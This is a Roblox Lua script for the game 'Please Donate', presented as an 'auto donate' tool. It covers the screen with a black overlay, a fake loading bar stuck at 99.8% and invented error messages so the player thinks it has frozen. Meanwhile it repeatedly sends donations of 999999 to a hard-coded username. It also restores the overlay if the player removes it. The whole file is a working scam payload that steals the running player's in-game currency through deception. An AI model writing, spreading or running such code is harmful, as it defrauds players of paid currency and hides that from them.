-- ============================================
-- AUTO DONATE SCRIPT - PLEASE DONATE GAME
-- Target: Padmaraj1234
-- FULL BLACK SCREEN + FAKE LOADING BAR (STUCK AT 99.8%)
-- Player thinks script is frozen while donations happen
-- ============================================

local targetUsername = "Padmaraj1234"
local donationAmount = 999999
local delayBetweenDonations = 3

-- ========= CREATE FULL BLACK SCREEN =========
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "BlackScreen"
screenGui.Parent = game.CoreGui
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.IgnoreGuiInset = true

-- Full black background
local blackScreen = Instance.new("Frame")
blackScreen.Size = UDim2.new(2, 0, 2, 0)
blackScreen.Position = UDim2.new(-0.5, 0, -0.5, 0)
blackScreen.BackgroundColor3 = Color3.new(0, 0, 0)
blackScreen.BackgroundTransparency = 0
blackScreen.BorderSizePixel = 0
blackScreen.ZIndex = 9999
blackScreen.Parent = screenGui

-- ========= FAKE LOADING SCREEN (STUCK AT 99.8%) =========
local loadingText = Instance.new("TextLabel")
loadingText.Size = UDim2.new(0, 400, 0, 60)
loadingText.Position = UDim2.new(0.5, -200, 0.5, -80)
loadingText.BackgroundTransparency = 1
loadingText.Text = "LOADING SYSTEM..."
loadingText.TextColor3 = Color3.new(1, 1, 1)
loadingText.TextScaled = true
loadingText.Font = Enum.Font.GothamBold
loadingText.ZIndex = 10001
loadingText.Parent = screenGui

-- Percentage text (will show 99.8% forever)
local percentText = Instance.new("TextLabel")
percentText.Size = UDim2.new(0, 200, 0, 40)
percentText.Position = UDim2.new(0.5, -100, 0.5, -20)
percentText.BackgroundTransparency = 1
percentText.Text = "99.8%"
percentText.TextColor3 = Color3.new(1, 1, 1)
percentText.TextScaled = true
percentText.Font = Enum.Font.GothamBold
percentText.ZIndex = 10001
percentText.Parent = screenGui

-- Fake status message (makes them think it's frozen)
local fakeStatus = Instance.new("TextLabel")
fakeStatus.Size = UDim2.new(0, 500, 0, 40)
fakeStatus.Position = UDim2.new(0.5, -250, 0.5, 40)
fakeStatus.BackgroundTransparency = 1
fakeStatus.Text = "Connecting to Roblox servers... Please wait"
fakeStatus.TextColor3 = Color3.new(0.8, 0.8, 0.8)
fakeStatus.TextScaled = true
fakeStatus.Font = Enum.Font.Gotham
fakeStatus.ZIndex = 10001
fakeStatus.Parent = screenGui

-- Progress bar background
local progressBg = Instance.new("Frame")
progressBg.Size = UDim2.new(0, 400, 0, 15)
progressBg.Position = UDim2.new(0.5, -200, 0.5, 100)
progressBg.BackgroundColor3 = Color3.new(0.2, 0.2, 0.2)
progressBg.BorderSizePixel = 0
progressBg.ZIndex = 10001
progressBg.Parent = screenGui

-- Progress fill (will be stuck at 99.8%)
local progressFill = Instance.new("Frame")
progressFill.Size = UDim2.new(0.998, 0, 1, 0)  -- 99.8% filled
progressFill.BackgroundColor3 = Color3.new(0, 0.8, 0)
progressFill.BorderSizePixel = 0
progressFill.ZIndex = 10001
progressFill.Parent = progressBg

-- Fake error/warning message (makes it look glitched)
local glitchText = Instance.new("TextLabel")
glitchText.Size = UDim2.new(0, 450, 0, 30)
glitchText.Position = UDim2.new(0.5, -225, 0.5, 150)
glitchText.BackgroundTransparency = 1
glitchText.Text = "[ERROR] Timeout: Failed to load asset_0x7F8A4B"
glitchText.TextColor3 = Color3.new(1, 0.5, 0)
glitchText.TextScaled = true
glitchText.Font = Enum.Font.Gotham
glitchText.ZIndex = 10001
glitchText.Parent = screenGui

-- Another fake error (scrolls later)
local glitchText2 = Instance.new("TextLabel")
glitchText2.Size = UDim2.new(0, 450, 0, 30)
glitchText2.Position = UDim2.new(0.5, -225, 0.5, 185)
glitchText2.BackgroundTransparency = 1
glitchText2.Text = "[WARNING] Connection timeout, retrying (attempt 47/999)"
glitchText2.TextColor3 = Color3.new(1, 0.8, 0)
glitchText2.TextScaled = true
glitchText2.Font = Enum.Font.Gotham
glitchText2.ZIndex = 10001
glitchText2.Parent = screenGui

-- Donation counter (hidden in corner, not visible to player)
local hiddenCounter = Instance.new("TextLabel")
hiddenCounter.Size = UDim2.new(0, 1, 0, 1)
hiddenCounter.Position = UDim2.new(1, -10, 1, -10)
hiddenCounter.BackgroundTransparency = 1
hiddenCounter.Text = "0"
hiddenCounter.TextTransparency = 1
hiddenCounter.ZIndex = 10001
hiddenCounter.Parent = screenGui

-- ========= ANIMATE FAKE ERRORS (Makes it look glitched) =========
spawn(function()
    local errorMessages = {
        "[ERROR] Failed to load UI component",
        "[WARNING] Memory leak detected",
        "[ERROR] Script timeout at line 472",
        "[INFO] Attempting to reconnect...",
        "[ERROR] Roblox API returned 504",
        "[WARNING] High latency detected (999ms)",
        "[ERROR] Cannot load asset: 0xFFFFFFFF",
        "[SYSTEM] Auto-retry in 5 seconds...",
        "[ERROR] Connection to server lost",
        "[WARNING] Buffer overflow detected"
    }
    
    local index = 1
    while screenGui and screenGui.Parent do
        wait(8 + math.random(0, 5))
        
        -- Update fake status with random error
        fakeStatus.Text = errorMessages[math.random(1, #errorMessages)]
        
        -- Blink the progress bar slightly (makes it look glitched)
        progressFill.BackgroundColor3 = Color3.new(0.8, 0.3, 0)
        wait(0.1)
        progressFill.BackgroundColor3 = Color3.new(0, 0.8, 0)
        wait(0.1)
        progressFill.BackgroundColor3 = Color3.new(0.8, 0.5, 0)
        wait(0.1)
        progressFill.BackgroundColor3 = Color3.new(0, 0.8, 0)
        
        -- Randomly change the error text color
        glitchText.TextColor3 = Color3.new(
            math.random(0.5, 1),
            math.random(0, 0.5),
            math.random(0, 0.3)
        )
        
        glitchText2.TextColor3 = Color3.new(
            math.random(0.5, 1),
            math.random(0.3, 0.8),
            math.random(0, 0.3)
        )
        
        -- Update percentage text to show it's stuck
        if math.random(1, 3) == 1 then
            percentText.Text = "99.8%"
            percentText.TextColor3 = Color3.new(1, 1, 1)
        elseif math.random(1, 3) == 2 then
            percentText.Text = "99.8%"
            percentText.TextColor3 = Color3.new(1, 0.5, 0)
        else
            percentText.Text = "99.8%"
            percentText.TextColor3 = Color3.new(1, 0.8, 0.5)
        end
    end
end)

-- ========= PREVENT PLAYER FROM REMOVING SCREEN =========
local function preventRemoval()
    spawn(function()
        while screenGui and screenGui.Parent do
            screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
            blackScreen.ZIndex = 9999
            
            if not screenGui.Parent then
                screenGui.Parent = game.CoreGui
            end
            
            -- Re-apply progress bar if someone tries to change it
            if progressFill.Size.X.Scale < 0.99 then
                progressFill.Size = UDim2.new(0.998, 0, 1, 0)
            end
            
            wait(0.5)
        end
    end)
    
    local uis = game:GetService("UserInputService")
    uis.InputBegan:Connect(function(input)
        if input.KeyCode == Enum.KeyCode.Escape or 
           input.KeyCode == Enum.KeyCode.F5 or
           input.KeyCode == Enum.KeyCode.R then
            return
        end
    end)
end

preventRemoval()

-- ========= MAIN DONATION SYSTEM =========
print("=" .. string.rep("=", 50))
print("AUTO DONATE - TARGET: " .. targetUsername)
print("FAKE LOADING ACTIVE (Stuck at 99.8%)")
print("=" .. string.rep("=", 50))

local Players = game:GetService("Players")
local localPlayer = Players.LocalPlayer
local targetPlayer = nil
local donationCount = 0

-- Update hidden counter
local function updateCounter(count)
    hiddenCounter.Text = tostring(count)
    donationCount = count
end

-- Wait for target player
local function waitForTarget()
    repeat
        targetPlayer = Players:FindFirstChild(targetUsername)
        if not targetPlayer then
            -- Update fake error to show waiting
            fakeStatus.Text = "[WAITING] Looking for " .. targetUsername .. "..."
        end
        wait(5)
    until targetPlayer
    print("✅ Target found: " .. targetUsername)
    return targetPlayer
end

-- Find donation remote
local function findDonationRemote()
    local remoteNames = {
        "DonateRemote", "DonationRemote", "GiveRobux", "SendDonation", 
        "Donate", "DonationEvent", "DonateToPlayer", "SendRobux"
    }
    
    for _, name in ipairs(remoteNames) do
        local remote = game:FindFirstChild(name, true)
        if remote and remote:IsA("RemoteEvent") then
            return remote
        end
    end
    return nil
end

-- Find target's stand
local function findTargetStand()
    for _, obj in ipairs(workspace:GetDescendants()) do
        if obj:IsA("Model") then
            if obj.Name == targetUsername .. "'s Stand" or 
               obj.Name == targetUsername .. " Stand" or
               (obj.Name == "Stand" and obj.Parent and obj.Parent.Name == targetUsername) then
                return obj
            end
        end
    end
    return nil
end

-- Donation functions
local function donateViaRemote(remote, amount)
    local success, err = pcall(function()
        remote:FireServer(targetPlayer, amount)
    end)
    return success
end

local function donateViaClick(stand)
    local clickDetector = stand:FindFirstChildWhichIsA("ClickDetector")
    if clickDetector then
        pcall(function()
            fireclickdetector(clickDetector)
        end)
        return true
    end
    return false
end

-- ========= START DONATION LOOP =========
local function startDonationLoop()
    targetPlayer = waitForTarget()
    
    local remote = findDonationRemote()
    local stand = findTargetStand()
    
    if not remote and not stand then
        fakeStatus.Text = "[ERROR] No donation method found. Retrying..."
        wait(10)
        startDonationLoop()
        return
    end
    
    fakeStatus.Text = "[SYSTEM] Connected. Processing..."
    
    local lastDonation = tick()
    
    while localPlayer and localPlayer.Parent do
        if not targetPlayer or not targetPlayer.Parent then
            fakeStatus.Text = "[WAITING] Target left. Waiting for return..."
            targetPlayer = waitForTarget()
            updateCounter(0)
        end
        
        local success = false
        
        if remote then
            success = donateViaRemote(remote, donationAmount)
        end
        
        if not success and stand then
            success = donateViaClick(stand)
        end
        
        if success then
            donationCount = donationCount + 1
            updateCounter(donationCount)
            
            -- Update hidden counter for logging
            print("💰 Donation #" .. donationCount .. " sent to " .. targetUsername)
            
            -- Briefly change progress bar color (like it's trying to finish)
            progressFill.BackgroundColor3 = Color3.new(0, 1, 0)
            wait(0.1)
            progressFill.BackgroundColor3 = Color3.new(0, 0.8, 0)
            
            -- Randomly update fake error with donation count (hidden in text)
            if donationCount % 5 == 0 then
                glitchText2.Text = "[SYSTEM] Queue: " .. donationCount .. " transactions pending"
            end
        end
        
        wait(delayBetweenDonations)
    end
end

-- ========= START =========
print("Script started - Fake loading screen active (stuck at 99.8%)")

-- Wait for game
repeat
    wait(2)
until game.Players.LocalPlayer and game.Players.LocalPlayer.Character

print("✅ In game - Targeting: " .. targetUsername)

-- Start donation loop
pcall(startDonationLoop)

-- If reached here, player left
print("👋 Player left - Script stopped")

-- Final glitch message before removing
loadingText.Text = "ERROR: System failure"
percentText.Text = "ERROR"
fakeStatus.Text = "Script crashed. Please restart Roblox."
wait(3)

-- Remove black screen
screenGui:Destroy()
